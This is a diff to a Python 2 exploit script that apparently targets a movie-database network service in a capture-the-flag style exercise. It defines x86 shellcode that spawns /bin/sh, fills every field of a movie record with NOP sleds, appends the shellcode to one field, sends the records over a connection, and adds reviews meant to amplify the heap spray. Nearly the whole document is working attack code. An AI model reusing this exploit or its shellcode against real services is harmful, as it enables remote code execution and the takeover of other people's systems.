@@ -21,6 +21,7 @@ SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\
 
 hacker = {"title":"Hackers",
           "director":"Iain Softley",
+          "writer"  : "Rafael Moreu",
           "star1":"Jonny Lee Miller",
           "star2":"Angelina Jolie",
           "star3":"Jessie Bradford",
@@ -46,6 +47,17 @@ hacker = {"title":"Hackers",
 ################################################################################
 def pause_script():
     raw_input("Paused... Press enter to continue: ")
+
+################################################################################
+#
+#   pause_script_msg
+#
+#   A useful function to wait for the user to press enter, that way you can 
+#   put in pause points easily, prints a custom message
+#
+################################################################################
+def pause_script_msg(message):
+    raw_input("Paused... " + message)
 
 ################################################################################
 #
@@ -107,9 +119,9 @@ def remove_movie(title,con):
 #   This will review a movie
 #
 ################################################################################
-def review_movie(title,con):
+def review_movie(title, review, con):
     # Choose the remove option from the main menu
-    con.send_line("d")
+    con.send_line("r")
     
     # Wait for a response
     time.sleep(1)
@@ -123,11 +135,23 @@ def review_movie(title,con):
     # Wait for a response
     time.sleep(1)
 
+    # Clear out the read buffer
+    con.read_one(0)
+
+    pause_script_msg("Press Enter to send review")
+
+    # Send the review
+    con.send_line(review)
+
+    # Wait for a response
+    time.sleep(1)
+
     # Read the response
     resp = con.read_line()
 
+    print "Response received: " + resp
     # Did we delete the movie?
-    return "Removed movie!" in resp
+    return "Reviewed!" in resp
 
 ################################################################################
 #
@@ -142,15 +166,14 @@ def send_movie(movie,con):
 
     # Send all the data in order
     con.send_line(movie["title"])
-    #pause_script()
+    con.send_line(movie["writer"])
     con.send_line(movie["director"])
     con.send_line(movie["star1"])
     con.send_line(movie["star2"])
     con.send_line(movie["star3"])
     con.send_line(movie["star4"])
     con.send_line(movie["star5"])
-    #con.send_line(movie["summary"])
-    con.send(build_string("a", 2000))
+    con.send_line(movie["summary"])
     con.send_line(movie["country"])
     con.send_line(movie["budget"])
     con.send_line(movie["opening_weekend"])
@@ -243,11 +266,12 @@ def build_nop_string(size):
     nop_string = ""
 
     for i in range(0, size):
-        if i == (size - 2):
-            nop_string += "\xeb\x01"
-            return nop_string
-        else:
-            nop_string += NOP
+        #if i == (size - 2):
+        #    nop_string += "\xeb\x01"
+        #    return nop_string
+        #else:
+        #    nop_string += NOP
+        nop_string += NOP
 
     return nop_string
 
@@ -271,26 +295,31 @@ def build_string(string, size):
 ################################################################################
 def build_movie():
 
-    title           = build_nop_string(500 - 1)
-    director        = build_nop_string(300 - 1)
-    star1           = build_nop_string(300 - 1)
-    star2           = build_nop_string(300 - 1)
-    star3           = build_nop_string(300 - 1)
-    star4           = build_nop_string(300 - 1)
-    star5           = build_nop_string(300 - 1)
-    summary         = build_nop_string(2000 - 1)
-    country         = build_nop_string(30 - 1)
-    budget          = build_nop_string(80 - 1)
-    opening_weekend = build_nop_string(80 - 1)
-    gross           = build_nop_string(80 - 1)
-    runtime         = build_nop_string(80 - 1)
-    aspect          = build_nop_string(40 - 1)
-    composer        = build_nop_string(300 - 1)
-    average_rating  = build_nop_string(3 - 1)
+    title           = build_nop_string(500)
+    director        = build_nop_string(300)
+    writer          = build_nop_string(300)
+    star1           = build_nop_string(300)
+    star2           = build_nop_string(300)
+    star3           = build_nop_string(300)
+    star4           = build_nop_string(300)
+    star5           = build_nop_string(300)
+    summary         = build_nop_string(2000)
+    country         = build_nop_string(30)
+    budget          = build_nop_string(80)
+    opening_weekend = build_nop_string(80)
+    gross           = build_nop_string(80)
+    runtime         = build_nop_string(80)
+    aspect          = build_nop_string(40)
+    composer        = build_nop_string(279)
+
+    composer += SHELLCODE
+
+    average_rating = build_nop_string(3)
 
     movie = {           
               "title" : title,
            "director" : director,
+             "writer" : writer,
               "star1" : star1,
               "star2" : star2,
               "star3" : star3,
@@ -315,22 +344,43 @@ def build_movie():
 #
 ################################################################################
 
-
 # Start the connection
 con = connect()
 
-pause_script()
+pause_script_msg("Press Enter to start exploit")
 
 movie = build_movie()
-send_movie(movie, con)
 
-pause_script()
+send_movie(movie, con)
+send_movie(hacker, con)
+
+print "Movie sent"
+pause_script_msg("Press Enter to start reviews")
 
 #go_interactive(con)
 
 # Create reviews to amplify the spray
 
+title  = NOP + "\0"
+review = build_nop_string(3)
+
+if review_movie(title, review, con):
+    print "Review Successful!\n"
+else:
+    print "Review Failed!\n"
+
 #hijack_execution(con)
+
+
+
+
+################################################################################
+#
+#   Spare Code
+#
+################################################################################
+
+
 
 #send_movie(hacker,con)
 #if remove_movie("Hackers",con):
